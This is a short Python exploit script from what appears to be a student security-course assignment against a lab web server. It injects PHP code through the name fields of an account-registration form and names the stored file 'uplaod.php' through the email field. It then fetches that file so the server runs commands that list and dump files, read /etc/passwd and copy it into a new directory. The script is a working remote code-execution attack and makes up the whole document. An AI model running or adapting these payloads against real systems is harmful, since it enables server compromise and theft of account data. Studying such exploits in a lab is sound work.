# Joshua Stuifbergen
# 4/21/19
# CISS 461
# Assignment 3 - PHP Exploit

# The script below will plant directories and files on a victims computer,
# or print information onto the website

# Supports POST requests to the input fields
import requests
# Location of php file to register a new user
url = 'http://10.7.64.2:8015/music-copyright/cgi-bin/account.php'

# Variables for the executables in the input fields
# first = "<?php exec('cd ..'); passthru('ls')?>" This one doesn't work
# first = "<?php passthru('cat /etc/passwd')?>"
# Prints to the webpage a list of user accounts followed by the contents of those accounts
first = "<?php passthru('ls ./'); passthru('cat ./*.*')?>"
last = "<?php exec('mkdir DrEvil'); exec('cat /etc/passwd > ./DrEvil/newfile')?>"

# The four required fields first and last name, email, and password
# This is loaded into the account directory where it is then created into
# a file with the email as the file name and first, last, and password within the file
payload = {
    'first': first,
    'last': last,
    'email': 'uplaod.php',
    'password': 'NothingToSeeHere2',
}

# Opens the default browser
session = requests.session()
# Goes to the path of account.php and uploads payload data, matching variables from the account.php program
r = requests.post(url, data=payload)
# A command injection with a new file 'uplaod.php', same name as the users email
r = requests.get('http://10.7.64.2:8015/music-copyright/cgi-bin/accounts/uplaod.php')


